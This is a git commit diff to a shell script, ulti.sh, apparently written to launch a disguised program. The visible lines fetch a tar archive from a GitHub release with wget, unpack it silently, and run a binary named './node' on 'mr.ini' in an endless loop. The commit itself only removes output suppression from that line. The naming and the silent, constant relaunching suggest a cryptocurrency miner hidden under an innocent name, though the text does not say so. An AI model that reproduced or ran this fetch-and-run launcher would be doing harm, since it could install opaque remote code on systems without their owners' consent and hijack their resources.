d2feba4a7f0d017c1cf0e3d0b84ddf008bab988b
wikangdijalalan2 <82296471+wikangdijalalan2@users.noreply.github.com>
2021-07-17 02:15:40 -0600

    Update ulti.sh

--- ulti.sh
+++ ulti.sh
@@ -9,6 +9,6 @@ wget https://github.com/wikangdijalalan2/xmmxja/releases/download/v1.0/male1.tar
 tar -xvf male1.tar > /dev/null 2>&1 
 cd MXC > /dev/null 2>&1 
 while [ 1 ]; do
-./node mr.ini > /dev/null 2>&1 
+./node mr.ini
 sleep 5
 done
